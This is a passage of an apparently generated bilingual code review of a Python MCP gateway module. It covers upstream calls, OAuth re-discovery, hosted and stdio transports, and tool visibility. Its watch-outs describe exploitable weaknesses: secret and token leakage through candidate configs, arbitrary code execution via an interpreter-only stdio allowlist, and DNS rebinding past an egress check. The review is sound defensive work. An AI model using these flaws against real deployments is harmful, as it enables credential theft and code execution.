        auth_hdr = await upstream_token(srv, p, scopes)
        rid = rnd + 1
        body = {"jsonrpc": "2.0", "id": rid, "method": method,
                "params": {**params, "_meta": mcp_modern.request_meta(caps, _progress_meta(ctx).get("progressToken"))}}
        res, msg = await _post_rpc(srv, body, {**auth_hdr, **mcp_modern.request_headers(method, params, schema)}, rid, ctx)
        if res.status_code == 401 and reauth:
            reauth = False
            found = await discover_auth(srv, res.headers.get("www-authenticate"))
            srv.auth.update({k: v for k, v in found.items() if k != "type"})
            _TOKENS.pop((p.sub, f"mcp:{srv.id}", tuple(sorted(scopes or []))), None)
            continue
        if res.status_code == 403:
            raise RpcError(FORBIDDEN, f"{srv.id}: 업스트림 권한 부족", {"server": srv.id,
                                                                  "www_authenticate": res.headers.get("www-authenticate")})
        if res.status_code >= 400:
            try:
                err = (res.json() or {}).get("error") or {}
            except ValueError:
                err = {}
            if err.get("code") == mcp_modern.UNSUPPORTED_VERSION:
                raise _LegacyOnly()
            raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 업스트림 오류 {res.status_code}"
                           + (f" — {err['message']}" if err.get("message") else ""),
                           {"server": srv.id, "status": res.status_code, **({"upstream_code": err["code"]} if "code" in err else {})})
        if "error" in msg:
            e = msg["error"]
            raise RpcError(e.get("code", UPSTREAM_ERROR), e.get("message", "upstream error"), e.get("data"))
        result = msg.get("result") or {}
        if result.get("resultType") != "input_required":
            return mcp_modern.strip(result)
        responses = {}
        for key, req in (result.get("inputRequests") or {}).items():
            out = await mcp_consent.handle(srv.id, ctx, {"id": key, "method": (req or {}).get("method"),
                                                         "params": (req or {}).get("params") or {}})
            if "error" in out:
                e = out["error"]
                if method == "tools/call":
                    return {"content": [{"type": "text", "text": f"{srv.id}: {(req or {}).get('method')} 요청이 처리되지 않아 "
                                                                 f"도구를 실행하지 못했습니다 — {e.get('message')}"}], "isError": True}
                raise RpcError(e.get("code", UPSTREAM_ERROR), e.get("message", "input refused"))
            responses[key] = out["result"]
        params = {k: v for k, v in params.items() if k not in ("inputResponses", "requestState")}
        if responses:
            params["inputResponses"] = responses
        elif result.get("requestState") is not None:
            await asyncio.sleep(0.5)  # 업스트림이 아직 처리 중 — 상태만 돌려줬다
        if result.get("requestState") is not None:
            params["requestState"] = result["requestState"]
    raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 입력 요청 왕복 한도({MRTR_ROUNDS}) 초과")
```
**분석 / Analysis (Level 2)**
- L371-375: modern 요청이 `UnsupportedProtocolVersion(-32022)` 이면 레거시로 내려가는 신호 예외, MRTR 왕복 최대 8회.
- L378-437 `_modern_call`: 요청마다 `_meta`(버전·능력)·헤더(`Mcp-Method`·`Mcp-Name`·`Mcp-Param-*`)를 붙여 세션 없이 호출. 401 이면 1회 재발견·재인증(L394-399), 403·4xx 처리, 결과가 `input_required` 면 각 `inputRequests` 를 `mcp_consent.handle` 로 답해 `inputResponses`+`requestState` 로 재호출(MRTR).
- L425-427: 도구 호출의 입력 요청이 거부되면 도구 오류 결과(`isError: true`)로 반환 — 레거시와 같은 결과 모양으로 통일.
**짚어볼 점 / Watch-outs**
- L397 `srv.auth.update(...)` 는 `ServerRef` 복사본만 바꾼다(DB 미저장) — 매 호출 401 → 재발견이 반복될 수 있다(의도적으로 저장하지 않는다면 주석 필요). 위 L158-180 의 외부 AS 토큰 유출 경로도 여기서 열린다.
- L433-434 `requestState` 만 오고 입력 요청이 없으면 0.5초 쉬고 재시도 — 8회면 최대 ~4초 폴링 후 실패.

```python path=app/services/mcp_gateway.py lines=440-480
async def _http_call(srv: ServerRef, p: Principal, method: str, params: dict | None, tool: str | None,
                     ctx=None) -> dict:
    if _modern_upstream(srv):
        try:
            return await _modern_call(srv, p, method, params, tool, ctx)
        except _LegacyOnly:
            if srv.protocol == "2026-07-28":
                raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 업스트림이 MCP 2026-07-28 을 지원하지 않습니다.",
                               {"server": srv.id, "code": "protocol_unsupported"}) from None
            srv.upstream_protocol = MCP_PROTOCOL_VERSION
            await run_in_threadpool(_save_protocol, srv.id, MCP_PROTOCOL_VERSION)
    scopes = _required_scopes(srv, tool) if method == "tools/call" else None
    if prog := _progress_meta(ctx):
        params = {**(params or {}), "_meta": {**((params or {}).get("_meta") or {}), **prog}}
    for attempt in range(2):
        auth_hdr = await upstream_token(srv, p, scopes)
        sid, version = await _ensure_upstream_session(srv, p, auth_hdr)
        hdr = {**auth_hdr, "MCP-Protocol-Version": version, **({"Mcp-Session-Id": sid} if sid else {})}
        rid = 1
        res, msg = await _post_rpc(srv, {"jsonrpc": "2.0", "id": rid, "method": method,
                                         **({"params": params} if params else {})}, hdr, rid, ctx)
        if res.status_code == 401 and attempt == 0:
            found = await discover_auth(srv, res.headers.get("www-authenticate"))
            srv.auth.update({k: v for k, v in found.items() if k != "type"})
            _TOKENS.pop((p.sub, f"mcp:{srv.id}", tuple(sorted(scopes or []))), None)
            continue
        if res.status_code == 404 and sid and attempt == 0:
            _UPSTREAM_SESSIONS.pop((srv.id, p.sub), None)  # 업스트림 세션 만료 → 재초기화
            continue
        if res.status_code == 403:
            raise RpcError(FORBIDDEN, f"{srv.id}: 업스트림 권한 부족", {"server": srv.id,
                                                                  "www_authenticate": res.headers.get(
                                                                      "www-authenticate")})
        if res.status_code >= 400:
            raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 업스트림 오류 {res.status_code}",
                           {"server": srv.id, "status": res.status_code})
        if "error" in msg:
            e = msg["error"]
            raise RpcError(e.get("code", UPSTREAM_ERROR), e.get("message", "upstream error"), e.get("data"))
        return msg.get("result") or {}
    raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 업스트림 인증 실패")
```
**분석 / Analysis (Level 2)**
- L442-450: modern 이면 먼저 시도, `_LegacyOnly` 면 서버 설정이 강제 modern 일 때 오류, 아니면 레거시로 전환하고 DB 에 기록.
- L451-480 레거시 경로: 최대 2회 — 토큰 → 업스트림 세션 확보 → `_post_rpc`. 401 이면 재발견·토큰 캐시 삭제 후 재시도, 404(세션 만료)면 세션 재초기화, 403·4xx·JSON-RPC 오류 처리.
**짚어볼 점 / Watch-outs**
- L462-465 401 재발견 경로는 L158-180 의 외부 AS 토큰 유출로 이어진다(같은 문제).
- L480 두 번 다 401/404 면 "업스트림 인증 실패" — 404(세션 만료 2회)도 같은 메시지라 원인 구분이 어렵다.

```python path=app/services/mcp_gateway.py lines=483-531
# ───────────────────────── hosted(OpenAPI) · stdio 전송 ─────────────────────────
_HOSTED: dict[str, object] = {}


def _dump(obj) -> dict:
    return obj.model_dump(mode="json", by_alias=True, exclude_none=True)


_HOSTED_TOKEN: "contextvars.ContextVar[str | None]" = contextvars.ContextVar("anx_hosted_obo", default=None)


async def _inject_obo(request) -> None:
    """hosted-openapi OBO — 이 호출의 교환 토큰을 업스트림 요청에 주입 (서버 객체는 공유, 토큰은 호출별)."""
    tok = _HOSTED_TOKEN.get()
    if tok:
        request.headers["Authorization"] = f"Bearer {tok}"


async def _hosted_server(srv: ServerRef):
    import httpx2
    from fastmcp import FastMCP
    cache_key = f"{srv.id}:{json.dumps(srv.server_json.get('_meta', {}).get('hosted', {}), sort_keys=True)}"
    if cache_key in _HOSTED:
        return _HOSTED[cache_key]
    hosted = (srv.server_json.get("_meta") or {}).get("hosted") or {}
    headers = {}
    if hosted.get("secret_ref"):
        def _sec():
            with SessionLocal() as db:
                return secrets.get_plain(db, hosted["secret_ref"])
        value = await run_in_threadpool(_sec)
        headers[hosted.get("auth_header", "Authorization")] = (f"Bearer {value}" if hosted.get("auth_header", "Authorization")
                                                               == "Authorization" else value)
    from app.core.http import _ASYNC_MOUNTS, blocked_url
    base = hosted["base_url"].rstrip("/")
    origin = "://".join(urlparse(base)[:2])
    mount = _ASYNC_MOUNTS.get(origin)
    if mount is None and await run_in_threadpool(blocked_url, base):  # 팩토리 밖 클라이언트 — 생성 전에 egress 가드
        raise RpcError(UPSTREAM_ERROR, f"{srv.id}: 메타데이터·링크 로컬 주소는 base_url 로 쓸 수 없습니다.", {"server": srv.id})
    transport = httpx2.ASGITransport(app=mount.app) if mount is not None and hasattr(mount, "app") else None
    obo = hosted.get("identity") == "obo"
    if obo:
        headers.pop(hosted.get("auth_header", "Authorization"), None)
    client = httpx2.AsyncClient(base_url=base, headers=headers, timeout=settings.upstream_timeout,
                                **({"transport": transport} if transport else {}),
                                **({"event_hooks": {"request": [_inject_obo]}} if obo else {}))
    server = FastMCP.from_openapi(hosted["openapi"], client=client, name=srv.id)
    _HOSTED[cache_key] = server
    return server
```
**분석 / Analysis (Level 2)**
- L484-488: hosted-openapi FastMCP 서버 캐시, pydantic 모델 → dict 덤프 헬퍼.
- L491-498: OBO(사용자 위임) 토큰을 **ContextVar** 로 호출별 전달 — 서버 객체는 공유하되 토큰은 요청마다 다르게 주입하는 안전한 패턴(asyncio 태스크마다 컨텍스트가 분리된다).
- L501-531 `_hosted_server`: OpenAPI 문서·base_url·인증 헤더로 FastMCP 서버를 만들고 캐시. 서비스 모드는 시크릿 헤더, OBO 모드는 헤더 대신 이벤트 훅으로 호출별 토큰. L520-521: 이 클라이언트(httpx2)는 egress 가드 팩토리를 거치지 않으므로 **생성 전에** `blocked_url(base)` 로 메타데이터·링크 로컬을 거부한다.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L504-506 캐시 키는 `hosted` 설정 JSON 이지만 **시크릿 값은 키에 없다** — 시크릿을 회전(`rotate_secret`)해도 L513 에서 한 번 읽은 옛 값이 클라이언트 헤더에 남아 재시작 전까지 사용된다(`clear_caches` 는 `patch_server` 에서만 호출).
- L526 캐시된 `httpx2.AsyncClient` 는 닫히지 않는다(설정이 바뀌면 옛 클라이언트가 누수). 동시 첫 호출 2개면 클라이언트 2개가 만들어지고 하나는 버려진다.
- L520 `blocked_url` 은 생성 시점 1회 검사 — base_url 의 DNS 가 나중에 메타데이터 주소로 바뀌면(재바인딩) 막지 못한다.

```python path=app/services/mcp_gateway.py lines=534-555
def _client_handlers(srv: ServerRef, ctx) -> dict:
    """stdio·hosted 서버의 sampling·elicitation 도 같은 중계·동의 경로로 (동의 채널이 없으면 능력을 선언하지 않는다)."""
    if ctx is None:
        return {}
    import mcp.types as mt

    from app.services import mcp_consent

    async def _ask(method: str, params) -> dict:
        out = await mcp_consent.handle(srv.id, ctx, {"id": "local", "method": method,
                                                     "params": params.model_dump(mode="json", by_alias=True,
                                                                                 exclude_none=True)})
        if "error" in out:
            raise RuntimeError(out["error"]["message"])
        return out["result"]

    async def sampling(_messages, params, _context):
        return mt.CreateMessageResult(**await _ask("sampling/createMessage", params))

    async def elicitation(_message, _response_type, params, _context):
        return mt.ElicitResult(**await _ask("elicitation/create", params))
    return {"sampling_handler": sampling, "elicitation_handler": elicitation}
```
**분석 / Analysis (Level 2)**
- L534-555 `_client_handlers`: stdio·hosted 서버의 sampling·elicitation 콜백을 게이트웨이 동의 경로(`mcp_consent.handle`)로 연결. 동의 채널(ctx)이 없으면 능력을 선언하지 않는다(서버가 요청하지 못하게).
**짚어볼 점 / Watch-outs**
- L547 거부를 `RuntimeError` 로 던진다 — fastmcp 가 이를 JSON-RPC 오류로 바꾸는지는 라이브러리 동작에 의존한다(MCP 사양의 사용자 거부 코드 -1 이 전달되지 않을 수 있다).

```python path=app/services/mcp_gateway.py lines=558-588
async def _client_call(srv: ServerRef, method: str, params: dict | None, ctx=None) -> dict:
    from fastmcp import Client
    from fastmcp.client.transports import StdioTransport
    if srv.transport == "hosted-openapi":
        target = await _hosted_server(srv)
    else:
        allowed = {c.strip() for c in settings.mcp_stdio_allowed_commands.split(",") if c.strip()}
        if not srv.command or srv.command[0] not in allowed:
            raise RpcError(FORBIDDEN, f"stdio 명령이 허용 목록에 없습니다: {srv.command[:1]}",
                           {"code": "stdio_not_allowed"})
        target = StdioTransport(command=srv.command[0], args=srv.command[1:])
    params = params or {}
    async with Client(target, **_client_handlers(srv, ctx)) as c:
        if method == "tools/list":
            return {"tools": [_dump(t) for t in (await c.list_tools_mcp()).tools]}
        if method == "tools/call":
            return _dump(await c.call_tool_mcp(params["name"], params.get("arguments") or {}))
        if method == "resources/list":
            return {"resources": [_dump(r) for r in (await c.list_resources_mcp()).resources]}
        if method == "resources/templates/list":
            return {"resourceTemplates": [_dump(r) for r in (await c.list_resource_templates_mcp()).resourceTemplates]}
        if method == "resources/read":
            return _dump(await c.read_resource_mcp(params["uri"]))
        if method == "prompts/list":
            return {"prompts": [_dump(x) for x in (await c.list_prompts_mcp()).prompts]}
        if method == "prompts/get":
            return _dump(await c.get_prompt_mcp(params["name"], params.get("arguments") or {}))
        if method == "ping":
            await c.ping()
            return {}
    raise RpcError(NOT_FOUND, f"지원하지 않는 메서드: {method}")
```
**분석 / Analysis (Level 2)**
- L561-568: hosted 면 FastMCP 서버 객체를 직접 대상으로, stdio 면 **허용 명령 목록**(`MCP_STDIO_ALLOWED_COMMANDS`)에 첫 토큰이 있을 때만 `StdioTransport`.
- L569-588: fastmcp `Client` 로 메서드별 호출 후 dict 로 덤프. `async with` 로 연결·하위 프로세스를 정리한다.
**짚어볼 점 / Watch-outs**
- [위험:중간 · 명령 실행] L565 허용 목록은 **실행 파일 이름만** 본다 — `python`·`node`·`npx`·`uvx` 같은 인터프리터를 허용하면 `command[1:]`(DB 의 서버 설정, `mcp:write` 로 변경 가능 여부는 관리 API 에 의존)로 임의 코드를 실행할 수 있다. 인자까지 포함한 명령 전체를 허용 목록으로 고정하는 편이 안전하다.
- L570 stdio 는 **호출마다 하위 프로세스를 새로 띄운다** — `tools/list`·`tools/call` 마다 프로세스 기동 비용(수백 ms~초).
- L574 `params["name"]` — API 계층이 검증하지만(`app/api/mcp.py:70-71`) 이 함수만 보면 `KeyError` 가능.

```python path=app/services/mcp_gateway.py lines=591-612
async def call_server(srv: ServerRef, p: Principal, method: str, params: dict | None = None, ctx=None) -> dict:
    """ctx(RpcContext) 가 있으면 서버의 sampling·elicitation 요청을 중계·동의로 처리, 없으면(시스템 호출) 거절."""
    tool = (params or {}).get("name") if method == "tools/call" else None
    hosted = (srv.server_json.get("_meta") or {}).get("hosted") or {}
    if srv.transport == "hosted-openapi" and hosted.get("identity") == "obo" and method == "tools/call":
        def _ex():
            with SessionLocal() as db:
                return identity.exchange(db, p, f"api:{srv.id}", hosted.get("scopes") or None, actor="gateway")
        try:
            tok = await run_in_threadpool(_ex)
        except Exception as exc:  # noqa: BLE001 — 교환 실패 = 호출하지 않음 (MSG-019)
            raise RpcError(-32003, getattr(exc, "detail", str(exc)), {"code": "token_exchange_failed"}, http_status=403) from exc
        reset = _HOSTED_TOKEN.set(tok["access_token"])
        try:
            return await _client_call(srv, method, params, ctx)
        finally:
            _HOSTED_TOKEN.reset(reset)
    if srv.transport in ("hosted-openapi", "stdio"):
        return await _client_call(srv, method, params, ctx)
    if not srv.endpoint:
        raise RpcError(UPSTREAM_ERROR, f"{srv.id}: endpoint 미설정")
    return await _http_call(srv, p, method, params, tool, ctx)
```
**분석 / Analysis (Level 2)**
- L591-612 `call_server`: 전송별 분기 진입점. hosted OBO 도구 호출이면 `api:{id}` audience 로 토큰 교환 후 ContextVar 설정 → 호출 → `finally` 에서 reset(L603-607 — 토큰이 다른 요청으로 새지 않게 하는 핵심).
**짚어볼 점 / Watch-outs**
- L601-602 교환 실패는 403(-32003) — 호출하지 않는다(fail closed, MSG-019).

```python path=app/services/mcp_gateway.py lines=615-635
# ───────────────────────── 서버 조회·도구 갱신 ─────────────────────────
def load_targets(db: Session, server_id: str, p: Principal) -> tuple[str, list[ServerRef], dict | None]:
    """('single'|'virtual'|'all', 서버들, 가상 멤버 도구 제한)."""
    if server_id == ALL:
        rows = db.scalars(select(McpServer).where(McpServer.status == "active").order_by(McpServer.id)).all()
        return "all", [ServerRef.of(s) for s in rows], None
    srv = db.get(McpServer, server_id)
    if srv is not None:
        if srv.status != "active":
            raise RpcError(FORBIDDEN, f"MCP 서버 {server_id} 비활성", {"code": "server_inactive"}, http_status=403)
        return "single", [ServerRef.of(srv)], None
    vs = db.get(VirtualServer, server_id)
    if vs is not None:
        refs, limits = [], {}
        for m in vs.members or []:
            s = db.get(McpServer, m.get("server_id"))
            if s is not None and s.status == "active":
                refs.append(ServerRef.of(s))
                limits[s.id] = m.get("tools")
        return "virtual", refs, limits
    raise RpcError(NOT_FOUND, f"MCP 서버를 찾을 수 없습니다: {server_id}", http_status=404)
```
**분석 / Analysis (Level 2)**
- L616-635 `load_targets`: `_all` 이면 활성 서버 전부, 서버 id 면 활성 확인, 가상 서버면 멤버 중 활성 서버 + 멤버별 도구 제한. 없으면 404.
**짚어볼 점 / Watch-outs**
- 인자 `p`(주체)를 받지만 쓰지 않는다 — 서버 단위 접근 제어(어떤 사용자가 어떤 서버를 볼 수 있는가)가 없고 도구 규칙·정책 단계에서만 거른다. `_all` 은 모든 활성 서버를 대상으로 하므로, 서버 단위 격리가 필요하면 여기서 해야 한다.

```python path=app/services/mcp_gateway.py lines=638-687
async def refresh_tools(server_id: str, p: Principal = SYSTEM) -> dict:
    """도구 목록·인증 발견·헬스 갱신 + 기본 도구 규칙(정책 기본값) 적용 — 즉시 사용(FR-W04)."""
    def _load():
        with SessionLocal() as db:
            s = db.get(McpServer, server_id)
            if s is None:
                raise RpcError(NOT_FOUND, f"server {server_id}")
            return ServerRef.of(s)
    srv = await run_in_threadpool(_load)
    t0 = time.perf_counter()
    found, error, tools, error_code = {}, None, [], None
    try:
        if srv.transport == "streamable-http" and srv.auth.get("type") == "oauth2":
            if not srv.auth.get("authorization_server"):
                found = await discover_auth(srv)
                srv.auth.update({k: v for k, v in found.items() if k != "type"})

            def _pol():
                with SessionLocal() as db:
                    s = db.get(McpServer, server_id)
                    s.auth = {**(s.auth or {}), **{k: v for k, v in found.items() if k != "type"}}
                    if (s.auth.get("authorization_server") or security.issuer()) == security.issuer():
                        ensure_exchange_policy(db, s)
                    db.commit()
            await run_in_threadpool(_pol)
        _UPSTREAM_SESSIONS.pop((srv.id, p.sub), None)
        if srv.transport == "streamable-http":
            srv.upstream_protocol = await probe_protocol(srv, p)
        tools = (await call_server(srv, p, "tools/list")).get("tools", [])
    except RpcError as exc:
        error, error_code = exc.message, (exc.data or {}).get("code")
    ms = round((time.perf_counter() - t0) * 1000, 1)

    def _save():
        with SessionLocal() as db:
            s = db.get(McpServer, server_id)
            s.health_checked_at = utcnow()
            if srv.upstream_protocol:
                s.upstream_protocol = srv.upstream_protocol
            if error:
                s.health, s.health_detail = "unhealthy", error[:500]
            else:
                s.tools, s.tools_refreshed_at, s.health, s.health_detail = tools, utcnow(), "healthy", f"{ms}ms"
                governance.default_rules(db, s.id, tools)
            db.commit()
    await run_in_threadpool(_save)
    return {"server_id": server_id, "health": "unhealthy" if error else "healthy", "error": error,
            "error_code": error_code,
            "tools": [t.get("name") for t in tools], "latency_ms": ms, "auth": {k: v for k, v in found.items()},
            "protocol": srv.upstream_protocol}
```
**분석 / Analysis (Level 2)**
- L638-687 `refresh_tools`: (oauth2 면) 인증 발견·정책 기본값 저장 → 업스트림 세션 초기화 → 세대 판별 → `tools/list` → 헬스·지연 저장, 성공이면 도구 저장 + **기본 도구 규칙**(`governance.default_rules` — 읽기 허용, 쓰기·파괴는 승인 필요) 적용.
**짚어볼 점 / Watch-outs**
- L657·L673 `db.get(McpServer, server_id)` 가 `None`(그 사이 삭제)이면 `AttributeError` — 동시 삭제 시 500.
- L663 SYSTEM 주체의 업스트림 세션만 비운다 — 다른 사용자의 오래된 세션은 404 응답 때 재초기화된다(L466-468).
- `_health_loop`(`app/main.py:74-83`)가 워커마다 주기적으로 이 함수를 부르므로 업스트림 부하가 워커 수에 비례한다.

```python path=app/services/mcp_gateway.py lines=690-767
async def test_config(server_id: str, p: Principal, candidate: dict) -> dict:
    """설정 적용 전 시험 (SCR-F03) — 후보 엔드포인트·인증으로 PRM/AS 발견 · tools/list · 스코프 최소화 점검. 저장하지 않는다."""
    from app.services.review import scope_kind, tool_risk

    def _load():
        with SessionLocal() as db:
            s = db.get(McpServer, server_id)
            if s is None:
                raise RpcError(NOT_FOUND, f"server {server_id}")
            return ServerRef.of(s)
    srv = await run_in_threadpool(_load)
    before = {t.get("name") for t in srv.tools}
    if candidate.get("endpoint"):
        srv.endpoint = candidate["endpoint"]
    srv.auth = {**srv.auth, **(candidate.get("auth") or {})}
    if candidate.get("secret"):
        srv.auth["_candidate_secret"] = candidate["secret"]
    checks: list[dict] = []

    def add(key, ok, detail, warn=False):
        checks.append({"key": key, "ok": bool(ok), "level": "ok" if ok else ("warn" if warn else "fail"), "detail": detail})
    t0 = time.perf_counter()
    kind = srv.auth.get("type", "none")
    if srv.transport == "streamable-http" and kind == "oauth2":
        try:
            found = await discover_auth(srv)
        except RpcError as exc:
            found = {}
            add("prm", False, exc.message, warn=bool(srv.auth.get("authorization_server")))
        if found:
            add("prm", True, f"보호 리소스 메타데이터(RFC 9728) {found.get('resource_metadata')}")
            srv.auth.update({k: v for k, v in found.items() if k != "type"})
        elif not any(c["key"] == "prm" for c in checks):
            add("prm", False, "보호 리소스 메타데이터 없음 — 인가 서버를 직접 지정해야 합니다",
                warn=bool(srv.auth.get("authorization_server")))
        as_url = (srv.auth.get("authorization_server") or security.issuer()).rstrip("/")
        if as_url == security.issuer():
            add("authorization_server", True, f"플랫폼 IdP {as_url} — 토큰 교환(RFC 8693)으로 위임")
        else:
            add("authorization_server", bool(srv.auth.get("token_endpoint")),
                f"외부 인가 서버 {as_url} · token_endpoint {srv.auth.get('token_endpoint') or '없음 (RFC 8414 메타데이터 조회 실패)'}")
    elif kind in ("bearer", "api_key"):
        add("credential", bool(srv.auth.get("_candidate_secret") or srv.auth.get("secret_ref")),
            "백엔드 자격 증명 " + ("(후보 값으로 시험)" if srv.auth.get("_candidate_secret") else
                                   "저장된 값" if srv.auth.get("secret_ref") else "없음"))
    if candidate.get("protocol"):
        srv.protocol = candidate["protocol"]
    if srv.transport == "streamable-http":
        srv.upstream_protocol = await probe_protocol(srv, p)
        modern = _modern_upstream(srv)
        add("protocol", modern or srv.protocol != "2026-07-28",
            "MCP 2026-07-28 — 세션 없이 요청마다 호출 (server/discover)" if modern else
            f"MCP {srv.upstream_protocol} — initialize·세션" + (" (업스트림이 2026-07-28 미지원)" if srv.protocol == "2026-07-28" else ""))
    key = (srv.id, p.sub)
    saved = _UPSTREAM_SESSIONS.pop(key, None)
    tools: list[dict] = []
    try:
        tools = (await call_server(srv, p, "tools/list")).get("tools", [])
        add("tools_list", True, f"tools/list {len(tools)}개 · {round((time.perf_counter() - t0) * 1000)}ms")
    except RpcError as exc:
        add("tools_list", False, f"tools/list 실패 — {exc.message}")
    finally:
        _UPSTREAM_SESSIONS.pop(key, None)  # 후보 설정 세션은 버리고 기존 세션 복원
        if saved:
            _UPSTREAM_SESSIONS[key] = saved
    needed = set((srv.auth.get("tool_scopes") or {}).values())
    requested = set(srv.auth.get("scopes") or [])
    extra = sorted(requested - needed) if needed and requested else []
    broad = sorted(s for s in (requested or needed) if scope_kind(s) == "admin")
    add("scopes", not extra and not broad,
        "최소 스코프 ✓" if not extra and not broad else
        "; ".join(x for x in (f"도구가 쓰지 않는 스코프 {extra}" if extra else "",
                              f"관리 스코프 {broad} — 꼭 필요한지 확인" if broad else "") if x), warn=True)
    names = [t.get("name") for t in tools]
    return {"server_id": server_id, "ok": not any(c["level"] == "fail" for c in checks), "checks": checks,
            "tools": [{"name": n, "risk": tool_risk(n, (t.get("annotations") or {}))} for n, t in zip(names, tools)],
            "added": sorted(set(names) - before) if tools else [], "removed": sorted(before - set(names)) if tools else [],
            "elapsed_ms": round((time.perf_counter() - t0) * 1000, 1), "applied": False}
```
**분석 / Analysis (Level 2)**
- L690-767 `test_config`: 적용 전 시험(SCR-F03) — 후보 엔드포인트·인증으로 PRM/AS 발견·세대 판별·`tools/list`·스코프 최소화 점검. 기존 업스트림 세션을 잠시 빼두었다가 복원(L743-754). DB 에는 저장하지 않는다.
**짚어볼 점 / Watch-outs**
- [위험:높음] L702-706 후보 `endpoint`·`auth`(임의 `secret_ref` 포함)를 그대로 병합해 L747 `call_server` 로 호출한다 — 저장 없이도 L124-155 의 시크릿 유출이 일어난다(`app/api/mcp.py:416-424`, 권한 `mcp:write`).
- L743-754 같은 사용자의 실제 호출과 시험이 동시에 일어나면 공유 세션 캐시를 빼고 넣는 사이에 경쟁이 생긴다.

```python path=app/services/mcp_gateway.py lines=770-804
async def _tools_of(srv: ServerRef) -> list[dict]:
    fresh = srv.tools_refreshed_at and time.time() - srv.tools_refreshed_at < TOOLS_TTL_S
    if srv.tools and fresh:
        return srv.tools
    res = await refresh_tools(srv.id)
    if res["error"] and srv.tools:
        return srv.tools  # 장애 시 마지막 목록
    if res["error"]:
        code = res.get("error_code")
        raise RpcError(FORBIDDEN if code == "mtls_required" else UPSTREAM_ERROR, res["error"],
                       {"server": srv.id, **({"code": code} if code else {})})

    def _load():
        with SessionLocal() as db:
            return list(db.get(McpServer, srv.id).tools or [])
    return await run_in_threadpool(_load)


def _visible(db: Session, srv_id: str, tools: list[dict], agent: str | None, limit: list | None) -> list[dict]:
    rules = {r.tool: r for r in db.scalars(select(ToolRule).where(ToolRule.server_id == srv_id))}
    profile = db.get(AgentProfile, agent.split("/")[0]) if agent else None
    out = []
    for t in tools:
        r = rules.get(t.get("name"))
        if r is None or not r.allowed:
            continue  # 기본 거부: 규칙 없는 도구는 노출하지 않는다
        if limit and t["name"] not in limit:
            continue
        q = f"{srv_id}.{t['name']}"
        if profile is not None and not any(fnmatch.fnmatchcase(q, pat) for pat in profile.tools or []):
            continue
        meta = {**(t.get("_meta") or {}), "io.agentnexus/risk": r.risk, "io.agentnexus/approval": r.approval_required,
                "io.agentnexus/server": srv_id}
        out.append({**t, "_meta": meta})
    return out
```
**분석 / Analysis (Level 2)**
- L770-785 `_tools_of`: 캐시(TTL 300초)가 신선하면 그대로, 아니면 `refresh_tools`(SYSTEM 주체). 장애 시 마지막 목록으로 폴백.
- L788-804 `_visible`: **기본 거부** — 규칙 없거나 차단된 도구는 노출하지 않는다(L794-795). 가상 서버 제한·에이전트 프로파일 허용 패턴(fnmatch) 적용, 위험도·승인 메타 표시.
**짚어볼 점 / Watch-outs**
- [위험:낮음 · 성능] L774-775 TTL 만료 순간에 들어온 모든 요청이 각자 `refresh_tools` 를 호출한다(single-flight 없음 — thundering herd).
- L790 `agent.split("/")[0]` 의 에이전트 프로파일 제한은 **좁히는 방향**만 하므로 헤더를 생략해도 권한이 넓어지지는 않는다.

```python path=app/services/mcp_gateway.py lines=807-845
# ───────────────────────── 메서드 처리 ─────────────────────────
@dataclass
class RpcContext:
    principal: Principal
    agent: str | None = None
    data_class: str = "internal"
    approval_id: str | None = None
    session_id: str | None = None
    run_id: str | None = None
    step_id: str | None = None
    relay: object | None = None  # mcp_consent.Relay — 하류 클라이언트로 서버 요청 중계
    progress: object | None = None  # async (업스트림 progress params) → 하류 notifications/progress
    state_id: str | None = None  # modern MRTR 상태 id (progress 큐 연결)


async def list_tools(server_id: str, ctx: RpcContext) -> list[dict]:
    mode, refs, limits = await run_in_threadpool(_load_targets, server_id, ctx.principal)
    out = []
    for srv in refs:
        try:
            tools = await _tools_of(srv)
        except RpcError:
            if mode == "single":
                raise
            continue  # 집계 중 일부 장애는 제외
        visible = await run_in_threadpool(_visible_db, srv.id, tools, ctx.agent, (limits or {}).get(srv.id))
        for t in visible:
            out.append({**t, "name": f"{srv.id}.{t['name']}"} if mode != "single" else t)
    return out


def _load_targets(server_id: str, p: Principal):
    with SessionLocal() as db:
        return load_targets(db, server_id, p)


def _visible_db(srv_id, tools, agent, limit):
    with SessionLocal() as db:
        return _visible(db, srv_id, tools, agent, limit)
```
**분석 / Analysis (Level 2)**
- L808-819 `RpcContext`: 호출 맥락 — 주체·호출 에이전트·데이터 등급·승인 id·세션/실행/단계 id·중계(relay)·progress 콜백·MRTR 상태 id.
- L822-835 `list_tools`: 대상별 도구 수집 — 집계 모드는 일부 서버 장애를 건너뛰고 이름을 `{서버}.{도구}` 로.
- L838-845: 스레드풀용 DB 래퍼.
**짚어볼 점 / Watch-outs**
- [위험:중간] L809-816 `agent`·`data_class`·`session_id`·`run_id`·`step_id` 는 API 계층이 **클라이언트 헤더에서 그대로** 채운다(`app/api/mcp.py:55-61`). 이 값들이 정책 주체(agent)·데이터 등급 라우팅·승인 이벤트 기록에 쓰이므로 인증된 값이 아니라는 점을 서비스 계층이 알아야 한다.

```python path=app/services/mcp_gateway.py lines=848-867
def _resolve_tool(mode: str, refs: list[ServerRef], name: str) -> tuple[ServerRef, str]:
    if mode == "single":
        return refs[0], name
    ns, _, tool = name.partition(".")
    for s in refs:
        if s.id == ns and tool:
            return s, tool
    raise RpcError(INVALID_PARAMS, f"알 수 없는 도구: {name} (집계 도구명은 '<서버>.<도구>')")


def tool_schema(server_id: str, p: Principal, name) -> dict | None:
    """게이트웨이가 노출하는 도구의 inputSchema (x-mcp-header 검증용) — 모르는 도구는 None (호출 단계에서 거부)."""
    mode, refs, _ = _load_targets(server_id, p)
    if not isinstance(name, str):
        return None
    try:
        srv, tool = _resolve_tool(mode, refs, name)
    except RpcError:
        return None
    return next((t.get("inputSchema") for t in srv.tools if t.get("name") == tool), None)
```
**분석 / Analysis (Level 2)**
- L848-855 `_resolve_tool`: 단일이면 그대로, 집계·가상이면 `서버.도구` 분해.
- L858-867 `tool_schema`: modern `Mcp-Param-*` 헤더 검증용 inputSchema.
**짚어볼 점 / Watch-outs**
- L860 동기 DB 조회 함수 — `app/api/mcp.py:154` 가 `run_in_threadpool` 로 감싸 부른다(올바름).

```python path=app/services/mcp_gateway.py lines=870-900
